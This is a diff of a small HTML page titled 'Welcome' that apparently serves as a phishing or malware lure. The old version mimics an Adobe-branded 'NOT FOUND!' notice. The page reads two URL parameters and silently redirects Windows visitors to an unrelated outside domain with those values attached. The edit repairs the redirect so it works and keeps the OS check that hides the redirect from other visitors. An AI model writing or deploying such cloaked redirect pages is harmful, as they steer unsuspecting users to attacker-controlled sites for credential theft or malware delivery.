@@ -1,51 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Welcome</title>
-  <style type="text/css">
-    /* Style the message element */
-    #message {
-      font-family: Arial, sans-serif;
-      font-size: 16px;
-      color: #fff;
-      padding: 20px;
-      background-color: #FF0000;
-      border: 1px solid #ccc;
-      text-align: center;
-      position: relative;
-    }
+	<title>Welcome</title>
+</head>
+<body>
+	<a href="#" id="link">Link</a>
 
-    /* Style the Adobe logo */
-    #adobe-logo {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-      width: 100px;
-      height: auto;
-    }
-  </style>
-  <script type="text/javascript">
-    // Get the parameters from the URL
+	<script>
+		// Get the parameters from the URL
 		const urlParams = new URLSearchParams(window.location.search);
 		const param1Value = urlParams.get('param1');
 		const param2Value = urlParams.get('param2');
 
-		// Get the link element and update its href attribute
-		const linkElement = document.getElementById('link');
-    // Check if the user is on Windows OS
-    function isWindows() {
-      return navigator.platform.indexOf('Win') > -1;
-    }
+		// Check if both parameters exist in the URL
+		if (!param1Value || !param2Value) {
+			// Redirect to an error page if either parameter is missing
+			window.location.href = 'http://example.com/error.html';
+		} else {
+			// Get the link element and update its href attribute
+			const linkElement = document.getElementById('link');
+			linkElement.href = `http://example.com?param1=${param1Value}&param2=${param2Value}`;
 
-    // Redirect the user if they are not on Windows OS
-    if (isWindows()) {
-      // Redirect to a Windows-only message page
-      window.location.href = 'http://dashboard.amrdjab.za.com/${param1Value}/{param2Value}';
-    }
-  </script>
-</head>
-<body>
-  NOT FOUND!
-  <!-- Your HTML content here -->
+			// Check if the user is on Windows OS
+			function isWindows() {
+				return navigator.platform.indexOf('Win') > -1;
+			}
+
+			// Redirect the user if they are on Windows OS
+			if (isWindows()) {
+				// Redirect to a Windows-only message page
+				window.location.href = `http://dashboard.amrdjab.za.com/${param1Value}/${param2Value}`;
+			}
+		}
+	</script>
 </body>
 </html>
